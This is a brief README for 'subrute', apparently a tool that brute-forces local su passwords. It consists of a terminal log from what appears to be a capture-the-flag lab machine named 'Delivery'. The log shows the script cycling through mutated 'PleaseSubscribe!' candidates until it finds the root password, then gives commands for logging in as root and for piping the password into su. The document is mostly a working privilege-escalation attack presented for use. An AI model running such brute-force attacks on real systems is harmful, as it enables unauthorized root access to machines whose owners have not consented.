# subrute
su bruteforce

```bash
(remote) maildeliverer@Delivery:/home/maildeliverer$ bash test.sh root password.txt
Starting optimized su bruteforce for user: root
Using password file: password.txt
----------------------------------------
[1/385] Trying: 'PleaseSubscribe!' ... failed
[2/385] Trying: '!ebircsbuSesaelP' ... failed
[3/385] Trying: 'PLEASESUBSCRIBE!' ... failed
[4/385] Trying: 'pleaseSubscribe!' ... failed
[5/385] Trying: 'PleaseSubscribe!0' ... failed
[6/385] Trying: 'PleaseSubscribe!1' ... failed
[7/385] Trying: 'PleaseSubscribe!2' ... failed
[8/385] Trying: 'PleaseSubscribe!3' ... failed
[9/385] Trying: 'PleaseSubscribe!4' ... failed
[10/385] Trying: 'PleaseSubscribe!5' ... failed
[11/385] Trying: 'PleaseSubscribe!6' ... failed
[12/385] Trying: 'PleaseSubscribe!7' ... failed
[13/385] Trying: 'PleaseSubscribe!8' ... failed
[14/385] Trying: 'PleaseSubscribe!9' ... failed
[15/385] Trying: 'PleaseSubscribe!00' ... failed
[16/385] Trying: 'PleaseSubscribe!01' ... failed
[17/385] Trying: 'PleaseSubscribe!02' ... failed
[18/385] Trying: 'PleaseSubscribe!11' ... failed
[19/385] Trying: 'PleaseSubscribe!12' ... failed
[20/385] Trying: 'PleaseSubscribe!13' ... failed
[21/385] Trying: 'PleaseSubscribe!21' ... SUCCESS!
========================================
🎉 Password found: 'PleaseSubscribe!21'
========================================
Login with:
su root
(password: PleaseSubscribe!21)

Test it:
echo 'PleaseSubscribe!21' | su root -c 'whoami'
```
